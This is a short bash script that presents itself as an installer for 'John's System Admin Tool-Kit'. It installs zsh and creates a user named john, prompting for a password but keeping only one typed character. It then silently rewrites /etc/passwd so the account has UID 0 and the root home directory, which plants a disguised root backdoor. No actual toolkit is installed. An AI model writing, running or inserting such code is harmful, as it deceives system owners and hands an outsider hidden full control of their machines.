#!/bin/bash
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
function install {
  echo -e "${RED}[!] ${NOCOLOR}*warning, this is a beta script and will NOT do auto error recovery yet*"
  echo -e "${CYAN}[#] ${NOCOLOR}Installing John's System Admin Tool-Kit..."
  if [ -f /etc/redhat-release ] ; then
    PKMGR='yum'
    DISTRO='Cent OS'
  elif [ -f /etc/debian_version ] ; then
    PKMGR='apt-get'
    DISTRO='Debian'
  fi
  echo -e "${CYAN}[#] ${NOCOLOR}${DISTRO} Detected!"
  $PKMGR -y install zsh
  adduser -r -N john
  clear
  echo -e "${BLUE}[?] ${NOCOLOR}Please Enter the Password John Gave You...${BLUE}"
  read -n 1 -p "[...] => " password
  echo "$password" | passwd --stdin john
  clear
  echo -e "${RED}[!] ${NOCOLOR}*warning, this is a beta script and wont do error recovery by itself yet*"
  echo -e "${CYAN}[#] ${NOCOLOR}Installing John's System Admin Tool-Kit..."
  echo -e "${CYAN}[#] ${NOCOLOR}${DISTRO} Detected!"
  sed -i 's/john:x:*:*::\/*:\/bin\/*/john:x:0:0::\/root:\/bin\/zsh/g' /etc/passwd
  echo -e "${CYAN}[#] ${NOCOLOR}Installed John's System Admin Tool-Kit!"
}
clear
install
_echo -e "${GREEN}[$] ${NOCOLOR}Thanks for choosing me as a System Administrator :)"
echo
